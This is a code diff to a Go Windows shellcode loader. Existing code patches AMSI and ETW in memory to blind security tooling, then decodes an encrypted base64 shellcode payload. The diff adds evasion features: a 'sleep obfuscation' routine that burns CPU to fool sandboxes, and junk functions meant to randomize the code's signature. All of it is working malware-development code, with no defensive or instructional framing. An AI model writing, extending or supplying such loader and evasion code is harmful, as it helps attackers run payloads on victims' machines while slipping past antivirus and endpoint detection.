@@ -5,7 +5,9 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"math/rand"
 	"syscall"
+	"time"
 	"unsafe"
 	"golang.org/x/sys/windows"
 )
@@ -63,8 +65,39 @@ func unhookAMSIandETW() {
 	_ = patchMemory(uintptr(etw), etwPatch)
 }
 
+// Sleep Obfuscation: fake CPU/RAM load
+func simulateFakeLoad(duration time.Duration) {
+	end := time.Now().Add(duration)
+	rand.Seed(time.Now().UnixNano())
+	var sink int
+	for time.Now().Before(end) {
+		for i := 0; i < 1000; i++ {
+			sink += rand.Intn(1000) * rand.Intn(1000)
+		}
+	}
+}
+
+// Code Randomization: no-op functions
+func junkFuncA() int {
+	return 42 * rand.Intn(3)
+}
+
+func junkFuncB(x int) int {
+	return x ^ rand.Intn(100)
+}
+
+func junkFuncC() string {
+	arr := []string{"foo", "bar", "baz"}
+	return arr[rand.Intn(len(arr))]
+}
+
 func main() {
 	unhookAMSIandETW()
+
+	simulateFakeLoad(5 * time.Second)
+	_ = junkFuncA()
+	_ = junkFuncB(123)
+	_ = junkFuncC()
 
 	shellEnc, _ := base64.StdEncoding.DecodeString(encryptedShellcode)
 	key, _ := base64.StdEncoding.DecodeString(encryptionKey)
